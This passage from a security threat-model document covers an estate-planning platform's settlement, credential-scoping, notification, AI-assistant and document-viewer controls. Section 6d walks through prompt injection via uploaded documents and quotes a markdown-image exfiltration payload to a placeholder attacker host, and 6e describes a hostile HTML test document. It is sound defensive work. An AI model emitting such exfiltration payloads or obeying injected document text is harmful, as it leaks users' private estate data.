  The narrowing is SCOPED TO THE EXECUTOR, and the scoping is the point. The
  grant query is untouched: an ordinary role-holder's `immediate`
  `contact:read` grant stays frozen from the waiting period onward, exactly as
  before, because that is a permission the owner gave while living and control
  4 is the reason it stops at a death report. What changes is that the
  executor no longer travels that road at all. Their authority is a
  `role_assignment`, not a `permission_grant` — the owner never granted them
  `contact:read` and `ENFORCED_GRANTS` should not grow a row claiming they did
  — so they get a SEPARATE arm, gated on control 5's ladder: the estate's
  contacts open when the DOCUMENTS rung is approved, asked of settlement on the
  executor's own forwarded bearer through the same `checkStageAccess` port
  assets uses for the inventory, and refused when settlement cannot be reached.

  Two arms rather than one widened query, because widening
  `effective_condition` or lifting the freeze predicate would have thawed every
  `on_death_verified` grant for every caller of profile's only grant reader —
  a blast radius nobody asked for, to serve one role.

  At verified the
  status becomes `settlement`, every session is revoked, live-token lookups
  fail via a status allowlist in the session SQL, and re-login gets the
  generic 401 with a distinct recorded reason (`account_settled` — decedent-
  credential replay is a detection signal). Post-verified rescue is
  deliberately not self-serve.
- *Reporter identity preserved (control 6).* `reported_by` is a verified
  platform user; rejected and voided cases are terminal rows that are never
  deletable (cases have no soft delete BY DESIGN), with `resolution`
  distinguishing operator rejection from owner void; every audit event on the
  flow preserves the reporter id.

**New trust machinery, flagged.** A static shared service credential
(`ServiceCredentialGuard`, constant-time compare, fail-closed when unwired;
required ≥32 chars in production) authenticates settlement on identity's
internal settlement-lock routes — the one flow with no user bearer token to
forward by construction. Interim until the mesh (mTLS/SPIFFE) provides
verifiable peer identity; the guard is the seam.

**Deliberate deviations.** Temporal is deferred behind a powerless in-process
driver (approved: there is no deployment for its durability to protect; the
DB state machine docs/02 §7 mandates is authoritative either way). Intake and
review-approve REFUSE in production while only the stub notifier is wired
(503, the M6 emergency-access precedent) — a waiting period nobody can be
told about is not a control.

**Control 5 — staged executor access — now shipped (PR2).**
- *Staged, ordered, separately approved.* `inventory → documents → vault`, and
  the order IS the control: an executor may request only the next rung, each
  requires an operator approval, and Zone A is therefore structurally the
  furthest grant from a fresh death report. A requested stage grants nothing.
- *Two people per stage.* The executor requests, an operator approves, and a
  DDL CHECK forbids them being the same person. Executor designation
  (`role_assignments`, the dormant `on_death_verified` half that settlement is
  the first consumer of) grants nothing on its own.
- *§6a closed.* The vault's emergency-access `request` AND `release` now
  consult settlement — twice, once before the waiting clock starts and again
  inside the release transaction after the row lock, because the period is
  days long and an estate can enter settlement in between. A non-terminal case
  without an approved `vault` stage BLOCKS; so does an unreachable settlement,
  since the client fails closed on every path. That direction is deliberate:
  blocking delays a legitimate recovery (the escrow is unspent and releases
  once the stage lands), while allowing hands a fraudulent "heir" the platform
  half of the recovery key inside the very window §5.1 exists to protect.
  Refusals are audited as `vault.emergency.release_blocked` with the case id.
  The gate is authenticated by the SERVICE credential, not the grantee's
  bearer — the question is about the owner's estate, not the caller's rights.
- *Distributions under dual control* (docs/02 §7): the recorder is stamped from
  the verified session at insert, the approver must differ, and a row-local
  CHECK enforces it immediately rather than a trigger (both parties are columns
  of the same row, so a CHECK is stricter — undeferrable and unbypassable).
  Amounts are envelope ciphertext under settlement's own `settlement/kek`, so
  profile's KMS grant cannot read them even sharing the cluster; the plaintext
  never enters a column, a log, or an audit payload.
- *Estate reads are the data owner's decision.* Assets exposes a separate
  executor route that forwards the caller's bearer to settlement and refuses on
  anything short of an explicit allow; settlement itself holds no data-read
  power, so compromising it mis-answers questions rather than exfiltrating an
  estate. Each such read is audited as `asset.estate.viewed` with the decedent
  as `onBehalfOf`.
- *Legal hold* (docs/00 compliance) is now settable — by settlement only,
  through a service-credential internal route, closing the M4 gap where the
  hold was enforced but had no writer.

**Residual added by PR2.**

- **[OWNER: M46]** *An insider operator plus a colluding executor is a
  two-party path to an estate.* A settlement operator can approve every stage
  of a case they did not report. Bounded by: the executor designation must
  already exist in the decedent's own contact records (made before the death),
  the reporter≠reviewer and requester≠approver rules, the waiting period and
  owner-void that precede any of it, and a fully audited trail. Reducing it
  further needs M-of-N operator approval, which belongs to the TB7
  operator-platform milestone alongside JIT elevation. **RE-OWNED FROM M21 BY
  M40 PR2** (§6fff): M-of-N operator approval IS peer approval, which M21's own
  scope statement excludes by name — so the M21 tag asked the milestone for the
  one thing it disclaims. §4 assigns peer approval to what it calls the "M21
  follow-on", and M40 PR2 makes that owner a real queue row. NOT E1: a second
  approver over the stage chain is a column and a CHECK in settlement's own
  cluster, and needs no IAM.

**Residuals accepted.**

- **[ACCEPTED]** *The liveness interlock narrows the lockout race to a single
  statement and cannot erase it.* A step-up committing inside that statement's
  window is still missed. **THE HARM IS THE OWNER'S, NOT THE ATTACKER'S**, and an
  earlier wording said the opposite: "the step-up buys nothing" prices the
  adversary's payoff, while the consequence that matters is §5.1's — a missed
  step-up entombs a LIVING owner in `settlement`, from which
  `ALLOWED_TRANSITIONS` has no exit. Accepted on its bounds rather than on that
  sentence: the window is one statement at the end of a days-long ceremony,
  settlement re-reads liveness before it asks and identity restates the predicate
  inside the write, so a step-up at any other instant voids the case; after the
  transition sessions are revoked, the status allowlist blocks every session
  lookup, and the attempt is preserved in `auth_events`. **ACCEPTED BY M40 PR2**
  (§6fff): closing it needs a `users` row lock on every step-up grant
  platform-wide, which no operator platform makes cheaper — it is an identity-side
  concurrency change and none of M21's four deliverables. The M21 tag was the
  catch-all §6r names, and re-owning it to E1 would be false: it needs no IAM.
- **[OWNER: E1]** *The interim allowlist has no JIT elevation.* Membership is
  standing rather than elevated-on-demand, so authority is held continuously by
  whoever is in the table. **SPLIT FROM ONE BULLET BY M40 PR2** (§6fff): it named
  TWO controls with two different owners and carried one tag, so whichever owner
  moved would have taken the other's item with it. JIT elevation needs the IAM the
  deployment does not have, which is E1's own definition, and both §4 and docs/04
  agree on that half.
- **[OWNER: M46]** *The interim allowlist has no peer approval, and one operator
  both approves and confirms a case* — two actions, one human, on the docs/03
  §5.1 chain. A settlement operator is a high-value target. Bounded by
  reviewer≠reporter, the liveness re-check, the owner's void, and the append-only
  audit trail; PR2's stage approvals add multi-party depth. M21 PR1 gave the
  allowlist an audited ceremony, which is attribution rather than elevation.
  **RE-OWNED FROM M21 BY M40 PR2** (§6fff): M21's scope excludes peer approval by
  name, §4 assigned it to what it called the "M21 follow-on", and M46 is that
  owner made real. NOT
  E1 — a second approver over the stage chain is a column and a CHECK in
  settlement's own cluster, the shape this service has already shipped FOUR
  times: `human_review_by <> reported_by` (migration 001), `decided_by <>
  requested_by` and `approved_by <> created_by` (002), and `claimed_by <>
  reported_by` (003). An earlier draft of this bullet said "twice", which was a
  hand count beside a thing that grows — the defect this whole milestone is
  about, committed inside the argument for moving the item.
- **[ACCEPTED]** *Rate limiting on settlement intake is still open, and M17
  PR1 did not close it.* That change bounds identity's own login and register
  routes (§6k); settlement's intake authenticates its callers and would need a
  per-reporter bound of its own. Noise remains bounded by the linked-contact
  gate and the one-open-case index. **ACCEPTED BY M40 PR2** (§6fff) on those
  bounds. **ITS CROSS-REFERENCE WAS WRONG IN TWO WAYS AND IS REPAIRED HERE:** the
  sibling residual is *Operator actions remain unbounded* at **§6bb**, not §6z —
  §6z has no rate-limiting residual at all — and it is owned by **M23** today.
  The "filed against the same owner" clause was NOT false when written, which is
  worse than if it had been: at `009bad7` (M21 PR2.5, 2026-08-17) the sibling did
  not exist anywhere in this document, so the sentence forward-referenced a
  residual nobody had written; M21 PR3a created it a day later (`388d22b`)
  carrying `[OWNER: M21]`, the same owner, which made the clause briefly TRUE;
  and M21 PR3b re-owned it to M23 two days after that. The claim was never
  re-checked at any of the three moments its truth changed. The
  bullet asked that the pair not be split across milestones; they are split, and
  deliberately, because they are not the same surface: this one bounds REPORTER
  traffic at intake, §6bb bounds authenticated OPERATOR actions. Recorded rather
  than reconciled, so the next reader sees the divergence instead of the claim.

**Service-credential scoping (added by the M7 security review, 2026-07-28).**
The internal service credentials introduced for the account lock and the §6a
gate are the one M7 mechanism that can bypass §5.1's control chain outright, so
they carry their own rule: **one secret per callee, per direction.** Each
variable is named for the service whose internal routes it OPENS
(`IDENTITY_INTERNAL_TOKEN`, `SETTLEMENT_INTERNAL_TOKEN`,
`DOCUMENTS_INTERNAL_TOKEN`), never for the caller that presents it, and no
value ever authenticates in both directions.

The review found the original design violating this: settlement used one config
field as both its inbound-expected and its outbound-presented value, which
transitively forced identity, settlement, vault and documents onto a single
shared secret. Anyone holding vault's copy — the most exposed service in the
product, and by Zone A design the one that should hold the least authority —
could call `PUT /internal/v1/settlement-lock/{victim}` twice and irreversibly
move a living user to `settlement` status with no case, no operator, no waiting
period and no owner-void window. That is §5.1's Critical outcome reached by
skipping every control above, and it is the sharpest illustration of why the
credential is scoped rather than shared: a static bearer secret confers exactly
the routes it opens, so the blast radius IS the naming discipline.
Settlement's config refuses to boot in production when its two credentials are
equal, because splitting the field does not stop an operator pasting one value
into both slots. Rotation remains a synchronized restart of two services; the
mesh mTLS/SPIFFE follow-up removes the static secret rather than improving it.

## 6c. Threat-model delta — M9 notifications (2026-08-04)

M9 turns the §6a/§6b notification PRECONDITIONS into a running control: the
notifications service (docs/01 §2.10, TB5's carrier boundary) delivers the
owner notifications that the emergency-access and settlement waiting periods
rest on. Controls shipped, each mapped to what this document demanded:

- **Content-free pointers are enforced by construction, not convention
  (§5.4, risk #10).** The wire schema has no text field — a closed kind enum,
  a user id, a requested channel, an optional deadline — so a compromised
  caller can trigger a template, never author a message. The template
  registry carries no user data beyond the deadline DATE, uses ONE uniform
  SUBJECT for every kind, and contains NO links of any kind. The production
  e2e asserts all three properties on a real delivered message.
  SCOPED PRECISELY (M9 security review): the uniform subject means a mailbox
  observer who sees only subject lines cannot tell which control fired, but
  the BODY names it in its first clause ("…asked for emergency access to your
  Estate vault", "A report was filed on your Estate account"). That is
  deliberate — an actionable body is what makes the notification a control
  rather than a curiosity — but it means a lock-screen preview and the
  carrier both learn the EVENT CLASS. See the residual below; the earlier
  claim that an observer "never learns WHICH control fired" was true of the
  subject only and is corrected here.
- **Recipient addresses never cross a cluster boundary (§5.3).** The service
  keeps its own store, AEAD under its own `notifications/kek` (core
  co-tenants cannot unwrap it), fed by identity at the two plaintext moments
  (registration, login). No email-ciphertext read path feeds this store —
  the one reader `users.email_ct` has (identity's M24 PR2 owner-disclosure
  route, §6rr) answers its owner and feeds nothing; no blind index exists on
  the store (nothing legitimate asks "which user has this address"). Every
  send's decrypt is a logged event.
- **The gates stay, and became visible.** The per-route 503s remain as
  defense in depth behind the production adapter pins (`NOTIFY_MODE=http`,
  `EMAIL_MODE=ses`), and now emit `vault.emergency.notifications_refused` /
  `settlement.notifications_refused` — a control firing must be
  distinguishable from an outage in the stream operators watch.
- **The credentials are scoped (§6b's rule), and there are TWO.** Corrected by
  the M9 security review, which found ONE credential opening both surfaces:
  `NOTIFICATIONS_INTERNAL_TOKEN` opens SEND only (holders settlement, vault),
  and `NOTIFICATIONS_RECIPIENTS_INTERNAL_TOKEN` opens the recipient upsert
  and is held by IDENTITY ALONE. The split matters because the two
  capabilities have different blast radii: sending is bounded spam, while
  deciding where a user's notifications GO is the power to silence the §5.1
  contact sweep and the §5.2 waiting-period alerts. Merged, vault's copy
  could silence settlement's death-case alerts and settlement's could silence
  vault's emergency-access alerts — cross-domain, and exactly what one secret
  per callee exists to prevent. Enforced by two guards binding two DI tokens;
  the service refuses to boot in production if the two values are equal, and
  pairwise aliasing refusals extend to both in every holder.

**Residuals, accepted and recorded:**

- **[OWNER: E4]** *Email is the only live channel.* §5.2's "multi-channel" and §5.1's
  "every channel including hardware-key challenge" remain aspirational;
  the contact trail records channel INTENT (push/sms/voice) while delivery is
  email. SMS/push arrive with their own carriers and their own review.
- **[OWNER: M30]** *No one-tap deny token yet.* Deny remains an in-app action ("open your
  Estate app"); an email-borne deny capability needs the vault UI's isolated
  origin to exist and its own token design + review. Until then the
  notification shortens discovery time but not the deny path. RE-OWNED FROM M27 BY
  M27 PR0, and the re-own is a design decision rather than a scheduling one. An
  EMAIL-borne one-tap deny is a per-recipient URL, and this section's own next
  paragraph records "no links at all" as a CLOSED half of the M6 leakage item,
  enforced by a green fence (`apps/services/notifications/test/templates.spec.ts`
  — "contains no links, anywhere, ever"). Building it inside M27 would mean
  reversing that fence, or waiting on E4's carrier. An IN-APP one-tap deny needs
  neither: it carries no URL and no carrier, and M30 is the milestone that builds
  the in-app feed. The residual is real and stays open; what changes is that it is
  owned by the milestone that can close it without reversing a control.
- **[ACCEPTED]** *Repointing an EXISTING user's address needs identity's credential.* Since
  the M9 review's split this is true as written: only
  `NOTIFICATIONS_RECIPIENTS_INTERNAL_TOKEN`, held by identity alone, can
  change where a user's alerts go. (Before the split it was false — vault's
  and settlement's copies sufficed, and this document said otherwise.)
  Recipient changes are versioned and audited, but see the next residual.
- **[OWNER: E1]** *The recipient-change audit cannot ATTRIBUTE.* `notification.recipient.updated`
  carries `actorId: null`, `actorType: 'service'` and an empty detail, the
  versions trigger stamps the system sentinel, and identity emits the same
  event on EVERY successful login — so the trail proves that an address
  changed and preserves the prior ciphertext, but cannot distinguish a
  legitimate login-time refresh from a malicious repoint. It is evidence for
  after-the-fact recovery, NOT a detection control, and should not be cited
  as one. Closing it means recording the calling service, which the static
  shared-secret model cannot do — it arrives with the mesh's peer identity.
- **[CLOSED: §6h]** *Users' addresses are UNVERIFIED.* **CLOSED by M14** — see §6h. The residual
  as it stood: registration performed no ownership proof, identity fed whatever
  the user typed into the delivery store, and `users.email_verified_at` was
  never written or read, so "identity's word" meant the address was TYPED, not
  OWNED. `users.email_verified_at` remains dead schema deliberately; the
  verified bit lives on `notification_recipients`, in the store that would have
  to do the reaching.
- **[OWNER: M30]** *The carrier sees addresses, timing, AND the event class (TB5).* Inherent
  to email, and wider than previously recorded here: the body names which
  control is running, so SES and the receiving provider get a per-address
  labelled event stream ("this account is in a death-review period"). The
  content-free doctrine bounds this to the event class — never estate
  content, never a name, an asset, a document title or a link — but it does
  not eliminate it. Closing it fully needs an out-of-band or encrypted push
  channel, i.e. the vault UI's isolated origin. SES supply-chain posture
  rides the existing AWS SDK pinning.
- **[OWNER: M30]** *`emergency.reminder` is declared but never emitted* (vault has no
  scheduler); the sweep-driven reminder belongs with Temporal or a later
  driver. RE-OWNED FROM M27 BY M27 PR0. `ScheduleModule|@Cron(` matches zero files
  repo-wide and Temporal is planned-but-absent, so nothing in the tree can fire a
  reminder today; M27 builds no scheduler and would have carried this untouched.
  M30 owns notification DELIVERY, and it is M30's call whether the reminder needs a
  real scheduler or can be emitted lazily when a request observes a `waiting`
  policy past its reminder point — the second needs no new infrastructure at all.

**The M6 delivery-channel identifier leakage item: PARTIALLY CLOSED.**
Answered by the M9 security pass rather than left owed. Closed, by
construction: no caller-authored text anywhere (the wire has no text field),
no identifiers of any kind in a message (no name, address, asset, document
title, case id, user id or token — the only variable is a date), no links at
all so no per-recipient URL can re-identify a recipient to the carrier, one
subject across all nine kinds, and addresses that never cross a cluster
boundary. Still open, and now recorded above rather than claimed closed: the
EVENT CLASS reaches the carrier and any body-preview observer, and that is
accepted deliberately because an actionable body is what makes the
notification function as a control. Fully closing it is the isolated-origin
push channel, a later milestone.

## 6d. Threat-model delta — M10 AI assistant PR1 (2026-08-04)

The assistant is the first component an attacker can address in **natural
language**, through document text the owner uploaded and asked it to read. Risk
#6 ("LLM prompt injection via uploaded docs", H/M) stops being a forecast here.

**Treatment, in the order it actually holds.** The register's stated treatment
was "untrusted-input framing, read-only tools, output filtering". Building it
made the ordering clear, and the ordering is the finding:

1. **No tool schema can name a subject.** A tool receives its authority — the
   verified session subject plus that caller's bearer — and declares only what
   to fetch, never whose data. Injected text can persuade the model to CALL a
   tool; it has no field in which to say whose estate it wants. Enforced at
   registry construction, so a violation is a process that will not start.
2. **No sink.** Every tool is read-only; there is no send, write, outbound-fetch
   or web-search tool. The worst a successful injection achieves is a
   misleading answer to the owner about the owner's own data, which is exactly
   why the impact rating is Medium and what keeps it there. Adding any
   outward-facing tool would change that rating and requires revisiting this
   section.
3. **Framing retrieved text as data is ADVISORY** and is documented as the
   weakest layer in its own source file. It neutralizes delimiter injection so
   content cannot terminate its own block, but a sufficiently clever payload can
   argue with layer 3. Layers 1 and 2 cannot be argued with.

"Output filtering" is deliberately NOT claimed as a control.

**MODEL-OUTPUT EXFILTRATION — CLOSED IN M11, and worth reading as a history of
how nearly it was not.** An M10 draft of this paragraph credited PR4 with
"restricted markdown, no autolinking, no remote images". PR4 shipped no
conversation UI and no renderer at all, so the paragraph dispositioned a live
risk against a control nobody had built — the M4 legal-hold zero-callers shape,
in prose. The M10 security review caught it and reopened the requirement, owed
by whoever shipped the chat surface, in the same PR as the first pixel of
model-authored text.

M11 is that PR, and the constraint is now real. `MessageText`
(`apps/web/src/components/MessageText.tsx`) is the ONLY renderer any message
gets, in either role, and it builds text nodes: no parser, no allowlist, no
`dangerouslySetInnerHTML` (a source scan over the whole app enforces that, with
`app/layout.tsx`'s theme script as the one declared exemption). A model-emitted
`![](https://attacker/?data=…)` renders as those characters — verified in a real
browser against a payload carrying a markdown image, a markdown link and a raw
`<img>` tag: zero image elements, zero anchors to the payload's host, zero
network requests to it.

Behind it, and independent of it, the app now sends a Content-Security-Policy
with `img-src 'self' data:` and `connect-src 'self'`, so the browser refuses a
remote image load even if a future renderer regresses. **That CSP is
deliberately not complete**: `script-src` still allows inline, because Next's
hydration bootstrap and the theme script are inline and locking them down needs
per-request nonces through middleware. Saying so plainly is the point — a
stricter directive that gets relaxed under deploy pressure would be worse than
an honest partial one.

It remains a rendering constraint rather than a filter on model output; calling
it filtering would overclaim. The cost is stated where it lands: answers render
as plain prose with no lists or emphasis, and whoever adds formatting inherits
this requirement, because adding a parser here is adding a sink.

**TB5 — the LLM provider boundary.** The assistant is the isolating service:
the provider SDK and its credential will exist only there (PR2). It holds NO
internal service credential in either direction, so a compromised assistant
replays the sessions it is currently serving and cannot mint new authority —
the property is machine-checked by the credential graph rather than asserted.
Conversation transcripts are Zone B under a dedicated `ai-assistant/kek`, and
they are persisted precisely so the client cannot supply history: a
client-supplied transcript could forge prior assistant turns and prior tool
results, and a forged tool result is indistinguishable from a real one.

**A constraint our own requirements impose on model choice.** docs/03 §4 TB5
requires providers under zero-data-retention agreements. Claude Fable 5
requires 30-day retention and is not available under ZDR, so the most capable
model is disqualified by our own threat model; PR2 targets a ZDR-eligible model.

**Consent.** Deny by default structurally — there is no `granted` boolean, so
a user who never answered and one who revoked are the same answer. Granting is
step-up gated because it widens third-party egress (export-class under docs/01
§5); revoking is not, on the M6 rule that the protective action must never be
harder than the permissive one.

**Recorded, not fixed.**
- **[OWNER: M33]** *Uploaded-document text remains unreadable by anything.* M4's OCR artifact has
  no decrypt counterpart and M10 does not add one, so the assistant cannot
  discuss anything a user uploaded. That is a capability gap, not a control —
  closing it means building a bulk-readable text path, which is what §5.3
  exists to prevent, and it needs its own PR, consent scope and delta.
- **[ACCEPTED]** *Conversations are outside staged settlement access (§6a).* An executor gets
  inventory, then documents, then vault; conversations are in none of those
  rungs. A transcript ranges over the whole estate and may contain content the
  owner never intended anyone to read, so admitting it would be a new
  CAPABILITY with its own threat-model delta and its own product decision —
  not a fix anybody owes. **ACCEPTED BY M40 PR3** (§6ggg), and the tag it
  replaces was the stale-owner shape this milestone exists to clear: M23 is
  `**COMPLETE.**` and deliberately did not do this. **THE DENIAL IS ENFORCED
  AND TESTED, NOT MERELY UNBUILT**, which is the correction this bullet needed —
  "a surface does not exist yet" is the justification shape M40 PR2 caught being
  wrong twice. `assistant.cedar` holds exactly ONE permit, keyed on `subject`
  rather than `owner`, so `owner.cedar`'s catch-all cannot match a conversation
  and neither can the two unscoped policies in the bundle; the three access
  rungs are `['inventory','documents','vault']` in five independent spellings
  cross-checked by a derived fence; and `assistant-policies.spec.ts` pins the
  deny with five assertions, so a later permit cannot be added silently. A
  denial answers a uniform 404, so the surface is not an existence oracle
  either.
- **[ACCEPTED]** *The egress assertion is narrow on purpose.* It refuses separated SSNs and
  Luhn-valid card numbers and deliberately passes names, emails and phone
  numbers, which are the PR2 tokenizer's job. A gate that fires on ordinary
  estate traffic is one people route around.

## 6e. Threat-model delta — M12 documents surface PR1 (2026-08-06)

M4 built the document service; nothing rendered a document until now. The new
surface is a place where **stored document content reaches a screen**, which
puts risk #6 (LLM prompt injection via uploaded docs, H/M) next to a second,
older question this repo had not yet had to answer: what happens when the
browser is handed a document's own markup.

**The renderer, and why it differs from `MessageText`.** §6d's answer for model
output was an ABSENCE — text nodes, no parser, no sink. A document cannot be
rendered that way and still be a document, so `DocumentViewer`
(`apps/web/src/components/DocumentViewer.tsx`) substitutes CONTAINMENT: the
bytes go into a `srcdoc` iframe with `sandbox=""` — the empty value, which
grants nothing: no scripts, no same-origin, no forms, no popups, no top-level
navigation. The component reads nothing and parses nothing, and it adds no
`dangerouslySetInnerHTML`: the M11 source scan covers the new files unchanged
and still allows exactly one use, `app/layout.tsx`'s theme script, which M11
declared as data. (An earlier draft of this paragraph said "anywhere in the
app" and dropped that declared exemption — corrected in the M12 review, since
a doc that overstates a control is the defect class this repo keeps finding.)

Three layers hold it, and only the first two are relied on:

1. **The sandbox.** No script executes, and the frame is in an opaque origin
   with no access to the app's DOM, storage or cookies. `allow-scripts` and
   `allow-same-origin` TOGETHER would undo the whole thing, so the exact value
   is asserted in the component's spec rather than matched as a substring.
2. **The page CSP.** A `srcdoc` frame inherits the embedding document's policy,
   so `img-src 'self' data:` and `connect-src 'self'` apply INSIDE the frame:
   a remote image smuggled into document text is refused by the browser, not by
   anything we wrote. This is the same CSP §6d describes, doing a second job.
3. **The `csp` attribute** (`default-src 'none'`), Chromium-only and stated
   here as defence in depth rather than as the control.

**Verified against a hostile document in a real browser**, not only in jsdom: a
payload carrying a remote `<img>`, an inline `<script>` writing to the parent, an
`onerror` handler, an off-origin `<form>`, a `target="_top"` link and a nested
remote iframe was substituted into the content response and rendered through the
real component. Result: zero network requests to the payload's host, the script
probe never fired, no element from the payload entered the parent DOM, and
`contentDocument` was unreachable from the page.

**A SECOND FENCE ships with it**, because the realistic regression is not an
edit to the viewer: a source scan asserts that `DocumentViewer.tsx` is the ONLY
file in the app that renders an `<iframe>`. A frame added elsewhere for a
preview or an embed would reopen the channel from a file nobody thought of as a
renderer — the credential-graph habit of stating the exception as data.

**What is NOT framed.** Only `text/html` with `encoding: utf8` reaches an
iframe, which is generated content — platform-rendered from a sha256-pinned
template with every substituted value HTML-escaped by the service. An upload can
never be `text/html` (the ingest sniff admits pdf/png/jpeg/tiff only), and the
component checks rather than trusting that invariant from a distance. Presenting
uploaded binaries is PR2's problem and gets its own decision.

**Audited-decrypt volume is a design constraint on this surface, not a
side effect.** Every content read emits `crypto.field.decrypted` +
`document.content.viewed` and consumes a KMS operation, so a list that
previewed content would convert one page load into N events on the user's own
trail and blunt exactly the per-principal decrypt-rate baseline §4 TB4 calls the
single most important insider control. Hence: metadata-only lists, no content
field on the document type, no prefetch, and no cache that would make a repeat
read invisible. Proven live against the stack — two Read presses produced
exactly two decrypt pairs, and loading the list and detail pages produced none.

**Recorded, not fixed.**
- **[OWNER: M41]** *The 404-vs-403 oracle is narrowed at the edge, not closed.* The BFF answers
  the uniform not-found for a plain downstream 403, so browser traffic cannot
  tell "no such document" from "someone else's". The service still
  distinguishes them for any other caller — the M4 review's open follow-up,
  unchanged, and the real fix belongs there. **RE-OWNED FROM M21 BY M40 PR1**
  (§6eee): this is one of SIX documents routes in the shape, and §6vv records
  the same shape on `plaid`'s two under M41 — one category, recorded twice,
  under two owners, with nothing connecting the records. The M21 tag was never
  an argument for M21: that milestone's scope statement excludes other services'
  guard surfaces, and this bullet's own last clause already said the fix belongs
  in the service. It is the catch-all shape §6r names, an item assigned to
  whichever milestone next touches the area, which is how an item goes
  uncosted.
- **[ACCEPTED]** *`documents.title` remains plaintext* (the M4 decision, on the
  `assets_view.title` precedent). The generate form now says so where the field
  is, rather than leaving users to infer that the title is protected like the
  contents.
- **[OWNER: M35]** *`script-src` is still not locked down*, exactly as §6d states. The sandbox
  does not depend on it: `sandbox=""` blocks script execution inside the frame
  whatever the page policy permits outside it.

**PR2 addendum — ingest, the ladder, and deletion (2026-08-06).**

*The upload gate is the SERVER's, and the client is built not to have an
opinion.* Magic-byte sniffing against the declared mime is the control against
polyglot mislabeling, and the malware scan is fail-closed and pre-storage, so
every refusal means the bytes reached no disk. A client-side type check would
be a second opinion that can disagree with the one that matters — so there is
none: `accept` is a picker hint, `file.type` is forwarded as a declaration, and
the only local check is the size cap, mirroring the server's own number. The
three refusals are kept apart to the last layer (`MALWARE_DETECTED`,
`UNSUPPORTED_CONTENT`, `SCAN_UNAVAILABLE`) because softening a positive scanner
finding into "unsupported file type" would withhold the one thing a user needs
to know about a file somebody sent them. Verified live against real clamd
through the browser: the signature-carrying PNG was refused and nothing stored.

*The execution ladder is computed where the requirements are verified.* Risk #8
is a legal/compliance failure in a state template, treated by "attorney-gated
template releases; per-state execution-requirement engine". A UI that hardcoded
the ladder would be a second copy of that engine, drifting toward the weakest
rung — which is precisely the fail-open the M4 review closed inside the
service. So the service returns `allowedTransitions` from its own
sha256-verified template source, the UI renders exactly that, and the write
path re-resolves the requirements inside its own transaction regardless. An
unverifiable template yields an EMPTY ladder, not a guessed one.

*Presenting an uploaded binary — the decision PR1 deferred.* Images render
INLINE from a `data:` URI: the page CSP already allows `img-src 'self' data:`,
the bytes reach the browser's image decoder (the same exposure any image on any
page carries), and a `data:` URI cannot reach the network. The mime is the
SERVICE's sniffed value, not the uploader's claim, and it is checked against a
closed set before it is interpolated, so no attacker-chosen string becomes the
type of a URI this page constructs. PDFs and TIFFs DOWNLOAD instead: a framed
PDF is the browser's PDF engine — a large parser — invoked on attacker-supplied
bytes inside our own frame tree, whereas a download hands the file to whatever
the user already trusts. The filename is generated from ids, never from
`documents.title`, because a filename is where user text ends up in a shell, a
sync client, or a mail header. Leaving this deferred a second time had a cost
the M12 review named: `Read` was offered for versions the viewer then refused,
so an audited decrypt was spent to display nothing.

*The search term left the URL.* `GET /v1/documents/search?q=` was M4's shape,
and M12 was its first caller. The term is by construction a word out of the
user's own estate — a beneficiary's name, a property address — and a query
string is the one part of a request intermediaries record by default; the
topology docs/01 §2 describes puts CloudFront and WAF access logs in that path.
It is a POST with the term in the body now. Nothing else changed: the term is
still reduced to per-user HMAC tokens and matched ciphertext-side, and no
decrypt happens to serve a search.

*Deletion.* Step-up gated per docs/01 §5, and the legal hold wins over the
owner. Running the real app exposed an ordering seam worth recording: the
step-up guard sits at the controller and the hold check inside the handler, so
a stale session is told `stepup_required` first and the hold only after. That
ordering is fine as defence in depth, but the UI must not send someone to find
an authenticator for an action that will be refused either way — a held
document is now not offered for deletion at all. RECORDED, NOT CHANGED: the
service's ordering, since moving the hold check ahead of the guard would put an
unauthenticated-for-this-action read of estate state before the gate.

## 6f. Threat-model delta — M13 people surface PR1 (2026-08-06)

M13 gives the M2 profile & contacts service its first consumer. PR1 hardens what
was already deployed, before anything is built on top; the surface itself (PR2)
and the contact-link ceremony (PR3) extend this section.

**TB8 (role-holders → owner's estate data) had no step-up gate on its own
control objects.** §5.5's boundary is enforced by `role_assignments` and
`permission_grants` — they are the data that decides what a beneficiary can
read. Creating one is a docs/01 §5 step-up action in terms ("trustee/executor
changes, beneficiary changes"), and M2 shipped all three mutation routes under
`CallerGuard` alone because it predates `@estate/auth-guard`; the sibling
beneficiary route in the asset service complied. So a bearer token stolen from a
live session was sufficient to name a trustee over an entire estate. Closed:
grant, revoke and permission-attach all require a step-up fresh within 5
minutes, uniformly across all twelve roles.

*Why revoke is gated and permission-withdrawal is not.* The M6 rule is that the
protective action must never be HARDER than the permissive one — equal is
allowed. Revoking an assignment is not purely protective in this domain: it
destroys the executor-resolution path M7 depends on and can strip the last
linked contact able to report a death or rescue a §5.1 case, so an attacker who
revokes is isolating the owner, not protecting them. Withdrawing one permission
grant genuinely only narrows, so it is `CallerGuard`-only — an owner who can see
a grant they regret must be able to pull it without first finding their
authenticator.

**A §5.1 control was revocable by accident, twice.** `contacts.linked_user_id`
is the anti-enumeration gate this document credits (§6b: intake "cannot
enumerate" *because* reporters must already be named by the decedent's contact
repository). Two ordinary, unaudited operations silently removed it:

- Editing any field of a contact cleared the column, because one encrypt helper
  hardcoded it null and fed both the insert and the update. Closed by type: the
  shape both statements are built from has no such key.
- Soft-deleting a contact left its `role_assignments` live while every
  role-holder query joins `contacts ... AND deleted_at IS NULL`, so an executor
  stopped resolving and every grant stopped being effective with the assignment
  still listed and no `role.revoked` emitted. Closed with `409 contact_in_use`:
  retiring a fiduciary is a separate, step-up-gated, audited act.

Both are the same class as the M7/M9 findings — a control that stops working
without saying so, indistinguishable from one that is working.

**A Zone B write path destroyed the most sensitive column in the product.**
`PUT /v1/profile` was a full replace while `GET /v1/profile` returns `ssnLast4`
and never `ssn`, so any edit through any client wrote NULL over `ssn_ct` and
`ssn_last4_ct`. Now absent means unchanged. The preservation deliberately copies
CIPHERTEXT: decrypt-and-re-encrypt would put the full SSN through the service on
every unrelated edit and emit a `crypto.field.decrypted` on `profile.ssn` each
time — pure added exposure on the §5.3 bulk-decrypt path in exchange for
nothing. A row whose `dek_id` is no longer the owner's active DEK (crypto-shred)
is refused rather than re-stamped, so an erased record cannot be made to look
intact.

**RECORDED, OWED BY PR2 (§4 TB4).**

- **[CLOSED: §6f]** *A list view was a bulk-decrypt surface.* Contact and
  family-member reads decrypt every field, one audited
  `crypto.field.decrypted` each, so twenty contacts was roughly a hundred
  events on the owner's own trail per page load — blunting the per-principal
  decrypt-rate baseline this document calls the single most important insider
  control. The DEK cache means it was never a hundred KMS operations, which is
  the weaker half of the control. PR1 did not change it; PR2 owed a narrowed
